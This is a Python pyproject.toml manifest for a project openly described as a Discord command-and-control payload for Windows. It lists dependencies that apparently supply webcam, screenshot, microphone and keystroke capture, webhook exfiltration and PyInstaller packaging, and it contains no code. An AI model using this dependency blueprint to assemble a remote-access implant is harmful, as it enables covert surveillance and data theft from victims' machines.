pyproject.toml
[project]
name = "discord-payload"
version = "1.0.0"
description = "Discord C2 Payload for Windows"
requires-python = ">=3.9"
dependencies = [
    "discord.py>=2.3.2",
    "requests>=2.31.0",
    "opencv-python>=4.8.1",
    "pyautogui>=0.9.54",
    "sounddevice>=0.4.6",
    "scipy>=1.11.4",
    "keyboard>=0.13.5",
    "psutil>=5.9.6",
    "pywin32>=306; sys_platform == 'win32'",
    "pycryptodome>=3.19.0",
    "discord-webhook>=1.3.0",
    "pillow>=10.1.0",
]

[build-system]
requires = ["hatchling"]
build-backend = "hatchling.build"

[tool.uv]
dev-dependencies = [
    "pyinstaller>=6.2.0",
]
